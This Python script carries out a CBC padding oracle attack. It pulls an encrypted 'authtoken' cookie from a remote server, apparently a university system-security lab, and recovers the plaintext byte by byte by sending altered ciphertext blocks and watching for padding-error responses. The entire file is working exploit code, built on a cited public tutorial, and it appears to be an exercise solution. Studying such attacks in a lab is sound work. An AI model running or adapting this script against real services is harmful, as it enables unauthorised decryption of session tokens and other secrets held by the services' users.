import requests
import math

basepath = 'https://cbc.syssec.lnrd.net/'
#basepath = "http://localhost:5000"
quotepath = basepath + '/quote'

# Based on https://robertheaton.com/2013/07/29/padding-oracle-attack/


def extractTokenFrom(response):
    tokenHeader = response.cookies.get('authtoken')
    return tokenHeader


def askPaddingOracle(ciphertext):
    cookies = {'authtoken': ciphertext.hex()}
    response = requests.get(quotepath, cookies=cookies)
    return response

# Decrypts a block of 16 bytes


def decryptBlock(previousBlock, blockToDecrypt):
    intermediateStateBytes = bytearray(16)
    decryptedPlainText = bytearray(16)

    for byteindex in range(15, -1, -1):
        paddingvalue = 16 - byteindex
        sneakyPreviousBlock = bytearray(16)

        for index in range(15, byteindex, -1):
            sneakyPreviousBlock[index] = paddingvalue ^ intermediateStateBytes[index]

        for value in range(0, 256):
            sneakyPreviousBlock[byteindex] = value
            blockToSend = sneakyPreviousBlock + blockToDecrypt

            response = askPaddingOracle(blockToSend)

            if 'padding is incorrect' not in response.text.lower():
                previousBlockValue = previousBlock[byteindex]
                intermediateByteValue = value ^ paddingvalue
                intermediateStateBytes[byteindex] = intermediateByteValue
                plaintextByte = previousBlockValue ^ intermediateByteValue
                decryptedPlainText[byteindex] = plaintextByte
                print('Decrypted byte, the current block is now: ' +
                      str(decryptedPlainText.decode().upper()))
                break
            else:
                continue

    print('Block is decrypted to be - ' + decryptedPlainText.decode().upper())
    return decryptedPlainText

# Assumes the ciphertext is 4 blocks of 16 bytes, could be made more generic


def runPOAttack(ciphertext):
    cipherbytes = (bytes.fromhex(ciphertext))

    plaintext: str = ""
    amountOfBlocks: int = math.ceil(len(cipherbytes)/16)

    cipherBlockArray = []

    for block in range(0, amountOfBlocks):
        cipherBlockArray.append(bytearray(cipherbytes[16*block:16*block+16]))

    for index in range(amountOfBlocks - 1, 0, -1):
        block = decryptBlock(
            cipherBlockArray[index - 1], cipherBlockArray[index])
        plaintext = block.decode() + plaintext

    print(plaintext)


def main():
    ciphertext = extractTokenFrom(requests.get(basepath))
    runPOAttack(ciphertext)


if __name__ == "__main__":
    main()
